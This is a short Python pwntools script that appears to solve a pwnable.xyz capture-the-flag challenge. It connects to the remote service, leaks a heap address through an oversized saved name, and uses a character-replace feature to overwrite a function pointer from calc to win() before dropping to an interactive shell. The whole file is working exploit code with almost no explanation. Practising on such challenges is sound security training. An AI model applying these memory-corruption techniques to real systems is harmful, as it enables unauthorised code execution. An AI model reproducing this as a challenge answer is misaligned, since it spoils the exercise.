from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30015)

sla = r.sendlineafter
sa = r.sendafter

def play(num1, num2):
    sa('> ', '1')
    r.sendline(str(num1) + ' ' + str(num2))

def save(name):
    sa('> ', '2')
    sa('Save name: ', name)

def delete(idx):
    sa('> ', '3')
    sla('Save #: ', str(idx))

def print_name():
    sa('> ', '4')

def change_char(old, new):
    sa('> ', '5')
    sla('Char to replace: ', old)
    sla('New char: ', new)

calc = 0x400d6b
win = 0x400cf3
cur = 0x6022c0
saves = 0x6022e0


# heap leak

sa('Name: ', 'A')

save('A' * 0x80)
print_name()

r.recvuntil('A' * 0x80)
heap = u64(r.recvline()[:-1].ljust(8, b'\x00'))


# overwrite cur->playFunc

for i in range(4):
    change_char(chr(0xff), chr(0x41))

if heap & 0xff000000 == 0:
    change_char(chr(0xff), chr(0x41))

change_char(chr(calc & 0xff), chr(win & 0xff))
change_char(chr((calc & 0xff00) >> 8), chr((win & 0xff00) >> 8))

sla('> ', '1') # call win()


r.interactive()